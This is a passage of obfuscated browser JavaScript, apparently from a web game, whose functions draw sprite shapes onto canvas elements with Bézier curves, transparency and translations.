			} else ⵠᐃ == ⵠⲆⲆΔᐃ && (Δ.globalAlpha = .5, Δ.translate(-88 * ᐃ, -95 * ᐃ), Δ.save(), Δ.translate(ᐃ * 174, ᐃ * 195.5), Ⲇᐃᐃ(Δ, -82 * ᐃ, ᐃ * -46.5, 164 * ᐃ, ᐃ * 93, ᐃ * 30), Δ.restore(), ΔⲆ(Δ, Ⲇᐃ[0]), Δ.globalAlpha = 1, Δ.save(), Δ.translate(174 * ᐃ, ᐃ * 170.5), Ⲇᐃᐃ(Δ, -81 * ᐃ, ᐃ * -59.5, 162 * ᐃ, 119 * ᐃ, ᐃ * 28), Δ.restore(), ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], 6.5 * ᐃ), ⵠᐃᐃ(Δ, 137 * ᐃ, ᐃ * 200, 22.090722034374522 * ᐃ), ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔⵠ]), ⵠᐃᐃ(Δ, ᐃ * 210, 200 * ᐃ, ᐃ * 22.090722034374522), ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔΔΔ]), ⵠᐃᐃ(Δ, 143 * ᐃ, 200 * ᐃ, 7 * ᐃ), ΔⲆ(Δ, Ⲇᐃ[4]), ⵠᐃᐃ(Δ, 204 * ᐃ, ᐃ * 200, 7 * ᐃ), ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠᐃ]));
			return Ⲇⵠ
		}

		function ΔᐃⲆⵠΔΔⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 264 * ᐃ;
			Ⲇⵠ.height = ᐃ * 246;
			Δ.translate(ⵠⲆᐃⵠ, ᐃ * ᐃΔᐃΔⲆ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(75 * ᐃ, ᐃ * 54);
			Δ.bezierCurveTo(ᐃ * 79, ᐃ * 21, 131 * ᐃ, ᐃ * ⲆⵠΔⵠΔΔΔ, 153 * ᐃ, ᐃ * 36);
			Δ.bezierCurveTo(204 * ᐃ, ᐃ * 27, ᐃ * 221, ᐃ * 52, 216 * ᐃ, ᐃ * 83);
			Δ.bezierCurveTo(241 * ᐃ, ᐃ * 103, ᐃ * 232, ᐃ * 138, ᐃ * 214, ᐃ * 147);
			Δ.bezierCurveTo(ᐃ * 223, 184 * ᐃ, 201 * ᐃ, 200 * ᐃ, ᐃ * 175, ᐃ * 199);
			Δ.bezierCurveTo(156 * ᐃ, 218 * ᐃ, ᐃ * 135, 222 * ᐃ, ᐃ * 114, ᐃ * 203);
			Δ.bezierCurveTo(ᐃ * 62, 213 * ᐃ, ᐃ * 66, ᐃ * 189, ᐃ * 59, ᐃ * 170);
			Δ.bezierCurveTo(27 * ᐃ, ᐃ * 164, 31 * ᐃ, ᐃ * 134, ᐃ * 38, ᐃ * 123);
			Δ.bezierCurveTo(ᐃ * ΔΔΔΔⲆⵠⲆ, 80 * ᐃ, 51 * ᐃ, 52 * ᐃ, 75 * ᐃ, ᐃ * 54);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆᐃ]);
			Δ.translate(0, ᐃ * -10);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(75 * ᐃ, ᐃ * 54);
			Δ.bezierCurveTo(ᐃ * 79, ᐃ * 21, 131 * ᐃ, ᐃ * 13, ᐃ * 153, ᐃ * 36);
			Δ.bezierCurveTo(ᐃ * 204, ᐃ * 27, ᐃ * 221, ᐃ * 52, ᐃ * 216, 83 * ᐃ);
			Δ.bezierCurveTo(241 * ᐃ, 103 * ᐃ, 232 * ᐃ, 138 * ᐃ, ᐃ * 214, 147 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 223, ᐃ * 184, 201 * ᐃ, ᐃ * 200, 175 * ᐃ, ᐃ * 199);
			Δ.bezierCurveTo(ᐃ * 156, 218 * ᐃ, ᐃ * 135, ᐃ * 222, ᐃ * 114, ᐃ * 203);
			Δ.bezierCurveTo(ᐃ * 62, ᐃ * 213, ᐃ * 66, ᐃ * 189, ᐃ * 59, 170 * ᐃ);
			Δ.bezierCurveTo(27 * ᐃ, ᐃ * 164, 31 * ᐃ, ᐃ * 134, 38 * ᐃ, ᐃ * 123);
			Δ.bezierCurveTo(11 * ᐃ, ᐃ * 80, 51 * ᐃ, 52 * ᐃ, 75 * ᐃ, 54 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠΔ], Ⲇᐃ[Δⵠⵠⵠ], ⵠⵠⲆⵠΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(121 * ᐃ, 102 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 111, 80 * ᐃ, 110 * ᐃ, ᐃ * 66, ᐃ * 108, 51 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 119, ᐃ * 65, 129 * ᐃ, 85 * ᐃ, ᐃ * 135, 99 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 142, 67 * ᐃ, ᐃ * 146, ᐃ * 60, ᐃ * 152, 50 * ᐃ);
			Δ.bezierCurveTo(154 * ᐃ, 71 * ᐃ, ᐃ * 152, 85 * ᐃ, ᐃ * 149, ᐃ * 104);
			Δ.bezierCurveTo(166 * ᐃ, ᐃ * 88, ᐃ * 175, ᐃ * 83, ᐃ * 188, ᐃ * 78);
			Δ.bezierCurveTo(179 * ᐃ, ᐃ * 91, ᐃ * 170, ᐃ * 103, 160 * ᐃ, 112 * ᐃ);
			Δ.bezierCurveTo(186 * ᐃ, 107 * ᐃ, ᐃ * 191, 107 * ᐃ, 204 * ᐃ, 108 * ᐃ);
			Δ.bezierCurveTo(195 * ᐃ, ᐃ * 114, ᐃ * 179, 120 * ᐃ, 163 * ᐃ, ᐃ * 123);
			Δ.bezierCurveTo(183 * ᐃ, 130 * ᐃ, ᐃ * 186, ᐃ * 135, ᐃ * 192, 140 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 179, 141 * ᐃ, ᐃ * 164, 139 * ᐃ, ᐃ * 153, 135 * ᐃ);
			Δ.bezierCurveTo(158 * ᐃ, ᐃ * 145, ᐃ * 163, 159 * ᐃ, 165 * ᐃ, ᐃ * 177);
			Δ.bezierCurveTo(154 * ᐃ, 166 * ᐃ, ᐃ * 145, ᐃ * 153, ᐃ * 138, ᐃ * 139);
			Δ.bezierCurveTo(133 * ᐃ, ᐃ * 155, 125 * ᐃ, 170 * ᐃ, 117 * ᐃ, ᐃ * 182);
			Δ.bezierCurveTo(116 * ᐃ, ᐃ * 160, ᐃ * 119, ᐃ * 151, 124 * ᐃ, 138 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 107, ᐃ * 150, 95 * ᐃ, 156 * ᐃ, ᐃ * 82, 159 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 94, ᐃ * 140, ᐃ * 101, ᐃ * 136, 113 * ᐃ, ᐃ * 128);
			Δ.bezierCurveTo(78 * ᐃ, ᐃ * 123, 75 * ᐃ, 121 * ᐃ, ᐃ * 67, ᐃ * 118);
			Δ.bezierCurveTo(ᐃ * 85, ᐃ * 112, ᐃ * 94, ᐃ * 112, 111 * ᐃ, 113 * ᐃ);
			Δ.bezierCurveTo(89 * ᐃ, ᐃ * 97, 85 * ᐃ, ᐃ * 93, ᐃ * 78, 82 * ᐃ);
			Δ.bezierCurveTo(92 * ᐃ, 85 * ᐃ, 101 * ᐃ, ᐃ * 90, ᐃ * 121, 102 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(128 * ᐃ, 103 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 111, 112 * ᐃ, ᐃ * 117, 136 * ᐃ, 140 * ᐃ, 130 * ᐃ);
			Δ.bezierCurveTo(151 * ᐃ, ᐃ * 126, 156 * ᐃ, 115 * ᐃ, 155 * ᐃ, 107 * ᐃ);
			Δ.bezierCurveTo(155 * ᐃ, ᐃ * 96, 154 * ᐃ, 94 * ᐃ, ᐃ * 148, ᐃ * 94);
			Δ.bezierCurveTo(141 * ᐃ, ᐃ * 94, ᐃ * 146, 104 * ᐃ, ᐃ * 136, ᐃ * 104);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ᐃ * 4);
			return Ⲇⵠ
		}
		const ΔⵠⵠⲆΔ = ⵠΔΔΔΔⵠⲆ;

		function ⲆⲆΔΔⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 22 * ᐃ;
			Ⲇⵠ.height = 22 * ᐃ;
			Δ.globalAlpha = .4;
			ⵠᐃᐃ(Δ, ᐃ * ⲆⲆᐃΔⲆⲆⲆ, ᐃ * 11, ᐃ * ᐃΔᐃΔⲆ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = .7;
			ⵠᐃᐃ(Δ, 11 * ᐃ, ΔΔΔΔⲆⵠⲆ * ᐃ, ΔⲆΔᐃᐃ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ⵠΔΔ;
			ⵠᐃᐃ(Δ, ᐃⵠΔⵠΔΔᐃ * ᐃ, 11 * ᐃ, 4 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆ]);
			return Ⲇⵠ
		}
		const ⵠⵠᐃⵠ = ⲆⲆΔⵠ;
		const ⵠΔΔΔⵠᐃΔⲆⵠ = ⵠⲆΔᐃᐃ;

		function ΔⲆᐃⵠᐃⲆᐃⲆΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ⵠΔⵠⵠᐃ * ᐃ;
			Ⲇⵠ.height = 20 * ᐃ;
			Δ.globalAlpha = .5;
			ⵠᐃᐃ(Δ, ᐃ * ⵠᐃⲆⲆΔ, ᐃΔⲆᐃⵠ * ᐃ, ΔΔΔΔΔ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			return Ⲇⵠ
		}
		const ⵠᐃᐃⵠΔⵠΔ = ᐃⵠⲆⲆᐃⵠⵠ;
		const ᐃᐃⵠΔⲆⵠᐃ = ᐃΔᐃΔᐃΔᐃ;
		const ⵠᐃΔⵠΔΔⵠ = ⲆⲆᐃⵠΔ;

		function ⵠΔΔⲆⲆⲆΔ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 185;
			Ⲇⵠ.height = 240 * ᐃ;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(44 * ᐃ, ᐃ * 137);
			Δ.bezierCurveTo(ᐃ * 60, ᐃ * 87, ᐃ * 68, ᐃ * 66, 92 * ᐃ, 67 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 115, ᐃ * 64, 129 * ᐃ, 97 * ᐃ, ᐃ * 137, 136 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 53, ᐃ * 181);
			Δ.bezierCurveTo(30 * ᐃ, 164 * ᐃ, ⵠΔⵠⵠⵠ * ᐃ, 150 * ᐃ, ᐃ * 11, 136 * ᐃ);
			Δ.bezierCurveTo(28 * ᐃ, 121 * ᐃ, 38 * ᐃ, 132 * ᐃ, 48 * ᐃ, ᐃ * 150);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 63, 208 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 75, 224 * ᐃ, 86 * ᐃ, 228 * ᐃ, 93 * ᐃ, ᐃ * 228);
			Δ.bezierCurveTo(ᐃ * 104, ᐃ * 229, 116 * ᐃ, ᐃ * 219, ᐃ * 122, 205 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃΔΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 130, 170 * ᐃ);
			Δ.bezierCurveTo(146 * ᐃ, 125 * ᐃ, 156 * ᐃ, 126 * ᐃ, 173 * ᐃ, 137 * ᐃ);
			Δ.bezierCurveTo(167 * ᐃ, ᐃ * 151, 143 * ᐃ, 174 * ᐃ, 131 * ᐃ, ᐃ * 183);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 39, ᐃ * 140);
			Δ.bezierCurveTo(ᐃ * 75, ᐃ * 126, 113 * ᐃ, 127 * ᐃ, ᐃ * 143, 137 * ᐃ);
			Δ.bezierCurveTo(141 * ᐃ, ᐃ * 186, 130 * ᐃ, 202 * ᐃ, 113 * ᐃ, ᐃ * 214);
			Δ.bezierCurveTo(85 * ᐃ, ᐃ * 228, 56 * ᐃ, 219 * ᐃ, ᐃ * 48, ᐃ * 173);
			Δ.bezierCurveTo(ᐃ * 40, 148 * ᐃ, 43 * ᐃ, ᐃ * 145, 39 * ᐃ, ᐃ * 140);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(90 * ᐃ, ᐃ * 95);
			Δ.bezierCurveTo(99 * ᐃ, 82 * ᐃ, 98 * ᐃ, ᐃ * 58, ᐃ * 99, 40 * ᐃ);
			Δ.bezierCurveTo(90 * ᐃ, 38 * ᐃ, 89 * ᐃ, ᐃ * 34, ᐃ * 92, ᐃ * 17);
			Δ.bezierCurveTo(92 * ᐃ, 5 * ᐃ, ᐃ * 83, ᐃ * 16, 78 * ᐃ, 29 * ᐃ);
			Δ.bezierCurveTo(72 * ᐃ, 59 * ᐃ, 87 * ᐃ, 81 * ᐃ, 89 * ᐃ, ᐃ * 87);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(90 * ᐃ, 86 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 95, ᐃ * 74, ᐃ * 95, 62 * ᐃ, 95 * ᐃ, 43 * ᐃ);
			Δ.bezierCurveTo(84 * ᐃ, ᐃ * 37, 86 * ᐃ, 34 * ᐃ, 89 * ᐃ, ᐃ * 16);
			Δ.bezierCurveTo(75 * ᐃ, 29 * ᐃ, 80 * ᐃ, 58 * ᐃ, ᐃ * 90, ᐃ * 85);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(ᐃ * 92, 117 * ᐃ);
			Δ.bezierCurveTo(98 * ᐃ, ᐃ * 87, ᐃ * 93, ᐃ * 78, ᐃ * 85, 76 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 85.5, ᐃ * 79.5, ᐃ * 85.5, ᐃ * 79.5, ᐃ * 86, 83 * ᐃ);
			Δ.bezierCurveTo(84 * ᐃ, ᐃ * 85.5, ᐃ * 84, ᐃ * 85.5, 82 * ᐃ, 88 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 90, 93 * ᐃ, 89 * ᐃ, ⵠⲆⲆᐃⵠΔⵠ * ᐃ, 92 * ᐃ, ᐃ * 117);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(ᐃ * 92, 175 * ᐃ);
			Δ.bezierCurveTo(95 * ᐃ, 135 * ᐃ, ᐃ * 98, 125 * ᐃ, ᐃ * 109, ᐃ * 121);
			Δ.bezierCurveTo(106 * ᐃ, 114 * ᐃ, ᐃ * 104, 114 * ᐃ, ᐃ * 102, ᐃ * 113);
			Δ.bezierCurveTo(ᐃ * 103, 106 * ᐃ, 104 * ᐃ, 103 * ᐃ, 107 * ᐃ, 96 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 74, 108 * ᐃ, ᐃ * 86, ᐃ * 157, 92 * ᐃ, ᐃ * 174);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆᐃⵠ]);
			return Ⲇⵠ
		}

		function ⲆⵠᐃᐃΔⲆΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 191;
			Ⲇⵠ.height = 153 * ᐃ;
			Δ.globalAlpha = .5;
			Δ.translate(0, 10 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 97.49996948242188, 95.12844848632812 * ᐃ);
			Ⲇᐃᐃ(Δ, -62.5 * ᐃ, -41.5 * ᐃ, 125 * ᐃ, ᐃ * 83, ᐃ * 20);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠⵠ], Ⲇᐃ[0], ᐃ * ⵠΔΔᐃΔ);
			Δ.globalAlpha = ᐃᐃⵠ;
			Δ.translate(0, ᐃ * -10);
			Δ.save();
			Δ.translate(ᐃ * 97.49996948242188, ᐃ * 95.12844848632812);
			Ⲇᐃᐃ(Δ, -62.5 * ᐃ, ᐃ * -41.5, 125 * ᐃ, 83 * ᐃ, 20 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔΔ], Ⲇᐃ[2], ᐃ * 4);
			Δ.globalCompositeOperation = ⵠ[172];
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(26.999969482421875 * ᐃ, ᐃ * 50.850677490234375);
			Δ.bezierCurveTo(46.499969482421875 * ᐃ, 64.85067749023438 * ᐃ, ᐃ * 46.499969482421875, ᐃ * 64.85067749023438, ᐃ * 65.99996948242188, ᐃ * 78.85067749023438);
			Δ.bezierCurveTo(ᐃ * 80.99996948242188, ᐃ * 87.85067749023438, ᐃ * 105.99996948242188, 82.85067749023438 * ᐃ, ᐃ * 114.99996948242188, ᐃ * 80.85067749023438);
			Δ.bezierCurveTo(130.99996948242188 * ᐃ, ᐃ * 69.85067749023438, ᐃ * 152.99996948242188, 70.85067749023438 * ᐃ, 166.99996948242188 * ᐃ, 67.85067749023438 * ᐃ);
			Δ.bezierCurveTo(156.99996948242188 * ᐃ, 52.850677490234375 * ᐃ, 156.99996948242188 * ᐃ, 52.850677490234375 * ᐃ, 146.99996948242188 * ᐃ, 37.850677490234375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 101.49996948242188, 37.350677490234375 * ᐃ, 101.49996948242188 * ᐃ, 37.350677490234375 * ᐃ, ᐃ * 55.999969482421875, 36.850677490234375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[3], ᐃ * ⲆΔⵠᐃ);
			Δ.globalCompositeOperation = ⵠ[512];
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 40.999969482421875, ᐃ * 59.850677490234375);
			Δ.bezierCurveTo(41.999969482421875 * ᐃ, 50.850677490234375 * ᐃ, 47.999969482421875 * ᐃ, ᐃ * 47.850677490234375, 56.999969482421875 * ᐃ, 49.850677490234375 * ᐃ);
			Δ.bezierCurveTo(65.99996948242188 * ᐃ, ᐃ * 41.850677490234375, 76.99996948242188 * ᐃ, ᐃ * 42.850677490234375, 90.99996948242188 * ᐃ, ᐃ * 47.850677490234375);
			Δ.bezierCurveTo(94.99996948242188 * ᐃ, 42.850677490234375 * ᐃ, 104.99996948242188 * ᐃ, 42.850677490234375 * ᐃ, ᐃ * 114.99996948242188, ᐃ * 47.850677490234375);
			Δ.bezierCurveTo(ᐃ * 131.99996948242188, 42.850677490234375 * ᐃ, ᐃ * 142.99996948242188, ᐃ * 48.850677490234375, ᐃ * 145.99996948242188, ᐃ * 56.850677490234375);
			Δ.bezierCurveTo(160.99996948242188 * ᐃ, 63.850677490234375 * ᐃ, ᐃ * 154.99996948242188, 69.85067749023438 * ᐃ, ᐃ * 155.99996948242188, 70.85067749023438 * ᐃ);
			Δ.bezierCurveTo(141.99996948242188 * ᐃ, ᐃ * 71.85067749023438, 141.99996948242188 * ᐃ, 71.85067749023438 * ᐃ, ᐃ * 127.99996948242188, ᐃ * 72.85067749023438);
			Δ.bezierCurveTo(110.99996948242188 * ᐃ, 83.85067749023438 * ᐃ, 107.99996948242188 * ᐃ, 82.85067749023438 * ᐃ, 90.99996948242188 * ᐃ, ᐃ * 85.85067749023438);
			Δ.bezierCurveTo(70.99996948242188 * ᐃ, ᐃ * 83.85067749023438, 64.99996948242188 * ᐃ, 79.85067749023438 * ᐃ, 53.999969482421875 * ᐃ, 70.85067749023438 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ᐃ * ᐃⵠⵠΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(33.999969482421875 * ᐃ, 65.85067749023438 * ᐃ);
			Δ.bezierCurveTo(36.999969482421875 * ᐃ, ᐃ * 59.850677490234375, 34.999969482421875 * ᐃ, 60.850677490234375 * ᐃ, 39.999969482421875 * ᐃ, ᐃ * 59.850677490234375);
			Δ.bezierCurveTo(47.999969482421875 * ᐃ, 61.850677490234375 * ᐃ, 62.999969482421875 * ᐃ, ᐃ * 76.85067749023438, 74.99996948242188 * ᐃ, ᐃ * 79.85067749023438);
			Δ.bezierCurveTo(ᐃ * 93.99996948242188, ᐃ * 85.85067749023438, ᐃ * 111.99996948242188, ᐃ * 83.85067749023438, 124.99996948242188 * ᐃ, ᐃ * 70.85067749023438);
			Δ.bezierCurveTo(129.99996948242188 * ᐃ, 67.85067749023438 * ᐃ, 145.99996948242188 * ᐃ, ᐃ * 65.85067749023438, ᐃ * 159.99996948242188, 67.85067749023438 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 159.99996948242188, ᐃ * 71.85067749023438, 159.99996948242188 * ᐃ, 71.85067749023438 * ᐃ, ᐃ * 159.99996948242188, 75.85067749023438 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 146.99996948242188, ᐃ * 72.85067749023438, ᐃ * 144.99996948242188, ᐃ * 75.85067749023438, 143.99996948242188 * ᐃ, 82.85067749023438 * ᐃ);
			Δ.bezierCurveTo(144.99996948242188 * ᐃ, ᐃ * 86.85067749023438, ᐃ * 140.99996948242188, 90.85067749023438 * ᐃ, ᐃ * 137.99996948242188, ᐃ * 86.85067749023438);
			Δ.bezierCurveTo(ᐃ * 139.99996948242188, 72.85067749023438 * ᐃ, 135.99996948242188 * ᐃ, 72.85067749023438 * ᐃ, 133.99996948242188 * ᐃ, 82.85067749023438 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 127.99996948242188, ᐃ * 88.85067749023438, ᐃ * 124.99996948242188, ᐃ * 70.85067749023438, ᐃ * 116.99996948242188, 86.85067749023438 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 110.99996948242188, 91.85067749023438 * ᐃ, 96.99996948242188 * ᐃ, ᐃ * 81.85067749023438, ᐃ * 89.99996948242188, ᐃ * 90.85067749023438);
			Δ.bezierCurveTo(85.99996948242188 * ᐃ, 92.85067749023438 * ᐃ, 81.99996948242188 * ᐃ, 95.85067749023438 * ᐃ, ᐃ * 76.99996948242188, 86.85067749023438 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 67.99996948242188, 93.85067749023438 * ᐃ, 67.99996948242188 * ᐃ, 91.85067749023438 * ᐃ, 60.999969482421875 * ᐃ, 79.85067749023438 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 53.999969482421875, 71.85067749023438 * ᐃ, 52.999969482421875 * ᐃ, 72.85067749023438 * ᐃ, 46.999969482421875 * ᐃ, 77.85067749023438 * ᐃ);
			Δ.bezierCurveTo(41.999969482421875 * ᐃ, 78.85067749023438 * ᐃ, ᐃ * 42.999969482421875, ᐃ * 69.85067749023438, ᐃ * 33.999969482421875, ᐃ * 65.85067749023438);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔΔᐃ], Ⲇᐃ[6], ⵠΔΔᐃΔ * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 68, 111.29513549804688 * ᐃ, ⵠⲆΔⲆᐃᐃⲆ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⵠⵠΔ], Ⲇᐃ[Δᐃⵠⵠⵠ], ᐃⲆᐃⲆⵠ * ᐃ);
			ⵠᐃᐃ(Δ, 123 * ᐃ, 111.29510498046875 * ᐃ, ⵠᐃⲆΔᐃᐃⲆ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[7], Ⲇᐃ[ⲆᐃΔⲆⵠ], 4 * ᐃ);
			ⵠᐃᐃ(Δ, 63 * ᐃ, ᐃ * 106, ΔΔᐃⲆ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[9]);
			ⵠᐃᐃ(Δ, ᐃ * 118, ᐃ * 106, ᐃ * 5);
			ΔⲆ(Δ, Ⲇᐃ[9]);
			return Ⲇⵠ
		}

		function ⵠⲆⵠⲆᐃⲆⵠ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 191;
			Ⲇⵠ.height = 153 * ᐃ;
			Δ.save();
			Δ.translate(ᐃ * 96.49996948242188, ᐃ * 66.79510498046875);
			Ⲇᐃᐃ(Δ, ᐃ * -79.5, ᐃ * -48.5, 159 * ᐃ, ᐃ * 97, ᐃ * 22);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[0], 4 * ᐃ);
			Δ.translate(ᐃ * 2, 0);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(ᐃ * 119, 28 * ᐃ);
			Δ.bezierCurveTo(119 * ᐃ, 22 * ᐃ, ᐃ * 119, 20 * ᐃ, 122 * ᐃ, ᐃᐃΔⵠⵠⵠΔ * ᐃ);
			Δ.bezierCurveTo(149 * ᐃ, ᐃ * 39, ᐃ * 149, ᐃ * 39, ᐃ * 176, 63 * ᐃ);
			Δ.bezierCurveTo(176 * ᐃ, 75 * ᐃ, ᐃ * 176, 75 * ᐃ, ᐃ * 175, ᐃ * 88);
			Δ.bezierCurveTo(174 * ᐃ, 90 * ᐃ, ᐃ * 174, ᐃ * 90, 172 * ᐃ, 93 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 171, 101 * ᐃ, ᐃ * 169, ᐃ * 109, ᐃ * 164, 113 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 163, 104 * ᐃ, ᐃ * 163, 104 * ᐃ, 162 * ᐃ, 95 * ᐃ);
			Δ.bezierCurveTo(155 * ᐃ, 105 * ᐃ, ᐃ * 155, ᐃ * 105, 147 * ᐃ, 116 * ᐃ);
			Δ.bezierCurveTo(87 * ᐃ, 114 * ᐃ, ᐃ * 87, 114 * ᐃ, ᐃ * 26, 112 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 27, 106 * ᐃ, 27 * ᐃ, 106 * ᐃ, 27 * ᐃ, ᐃ * 101);
			Δ.bezierCurveTo(24 * ᐃ, 104 * ᐃ, ᐃ * 24, 104 * ᐃ, ᐃ * 20, ᐃ * 108);
			Δ.bezierCurveTo(ᐃ * 17, ᐃ * 103, ⵠⵠΔΔᐃ * ᐃ, 86 * ᐃ, ᐃ * 23, 72 * ᐃ);
